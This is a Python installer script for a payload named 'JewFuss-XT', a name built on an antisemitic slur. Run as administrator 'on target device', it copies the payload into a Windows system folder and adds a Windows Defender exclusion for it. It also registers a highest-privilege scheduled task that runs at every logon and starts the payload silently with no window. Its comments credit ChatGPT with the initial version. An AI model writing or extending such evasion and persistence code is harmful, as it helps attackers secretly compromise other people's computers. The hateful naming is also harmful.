import os
import shutil
import sys
import subprocess
import PyElevate
import time
import psutil

target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want, as long as it will be able to access it
printnonerrors = False

# running as .py will just compile it, the uncompiled version does not work

# this is a alternive to the normal startup command for jewfuss-xt, this version will auto exempt from windows defender and create a scheduled task to run as admin for any user on startup
# using the $startup commmand will break this as it moves the location of jewfuss-xt, in witch the scheduled task will not be able to find it etc, so just dont use the command :)
# using this requires a bit of setup, first complie jewfuus-xt and leave it in the builds folder
# than compile this script using the command above, and run it the output exe as as adminastrator on target device

# also you are god damn right chatGPT made most of this (nost really just means the inital verison), I don't have the time nor knolage on scheduling tasks using commands

# Define the target directory and name of bundled executable to run

try:
    if os.path.splitext(sys.argv[0])[1].lower() == ".py": # compile if ran as .py
        app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
        
        if not app_name:
            app_name = "JewFuss-XT.exe"
            
        while True:
            if os.path.exists(f"builds/{app_name}"):
                break
            else:
                app_name = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
        
        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{app_name};." --distpath=builds --workpath=data installer.py')
        exit("Finnished compiling")
        
except KeyboardInterrupt:
    exit("Keyboard interupt, exiting compiler...")
    
except Exception as e:
    print(f"Error compiling: {e}")
    
errored = False # Don't change
def add_defender_exclusion(file_path):
    global errored
    try:
        defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{file_path}\\""'
        subprocess.run(defender_command, shell=True, check=True)
        if printnonerrors: print(f"Windows Defender exclusion added for {file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error adding Defender exclusion: {e}")
        errored = True

def create_scheduled_task(task_name, file_path):
    global errored
    try:
        schtasks_command = (
            f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
            f'/sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
        )
        
        disable_conditions_command = (
            f'powershell -Command "'
            f'$task = Get-ScheduledTask -TaskName \\"{task_name}\\"; '
            f'$task.Settings.DisallowStartIfOnBatteries = $false; '  # Allow task to start on battery
            f'$task.Settings.StopIfGoingOnBatteries = $false; '      # Do not stop if switching to battery
            f'$task.Settings.ExecutionTimeLimit = \'PT0S\'; '       # Disable time limit
            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $task.Settings"'
        )

        subprocess.run(schtasks_command, shell=True, check=True)
        subprocess.run(disable_conditions_command, shell=True, check=True)
        
        if printnonerrors: print(f"Scheduled task '{task_name}' created successfully with modified power & time conditions.")
    
    except subprocess.CalledProcessError as e:
        print(f"Error creating scheduled task: {e}")
        errored = True

if not PyElevate.elevated():
    input("Please run this installer as an administrator.")
    exit(0)

if not os.path.exists(target_dir):
    os.makedirs(target_dir)
    if printnonerrors: print(f"Created folder: {target_dir}")

if getattr(sys, 'frozen', False):
    temp_dir = sys._MEIPASS
else:
    temp_dir = os.path.dirname(os.path.abspath(__file__))

extracted_app_path = os.path.join(temp_dir, app_name)
final_app_path = os.path.join(target_dir, app_name)

if printnonerrors: print(f"Installing to: {final_app_path}")

try:
    if os.path.exists(final_app_path):
        if printnonerrors: print(f"Found existing file")
        try:
            if any(app_name.lower() in (p.info['exe'] or '').lower() for p in psutil.process_iter(['exe'])): 
                if printnonerrors: print("Terminating existing process...")
                os.system(f'taskkill /im "{app_name}" /f ')
                if printnonerrors: print(f"Terminated {app_name}, waiting a second for process to close...")
                time.sleep(1)
            os.remove(final_app_path)
            if printnonerrors: print(f"Deleted existing file: {app_name}")
        except Exception as e:
            print(f"Error deleting existing file: {e}\nRetrying in 1 second...")
            time.sleep(1)
            try:
                os.remove(final_app_path)
            except Exception as e:
                print(f"Fatal Error: Error deleting existing file: {e}")
            input("Press Enter to exit.")
            sys.exit(1)
    try:
        shutil.copy(extracted_app_path, final_app_path)
        if printnonerrors: print(f"Copied {app_name} to {target_dir}")
    except Exception as e:
        print(f"Fatal Error: Error moving file: {e}")
        input("Press Enter to exit.")
        sys.exit(1)

except Exception as e:
    input(f"Fatal Error: Error moving file: {e}")
    sys.exit(1)

add_defender_exclusion(final_app_path)
create_scheduled_task(app_name.replace(".exe", ""), final_app_path)

try:
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    if printnonerrors: print(f"Started {final_app_path} silently (no console)")
except Exception as e:
    print(f"Error running {app_name}: {e}")
    errored = True

if errored:
    input("Press Enter to exit.")    
sys.exit(0)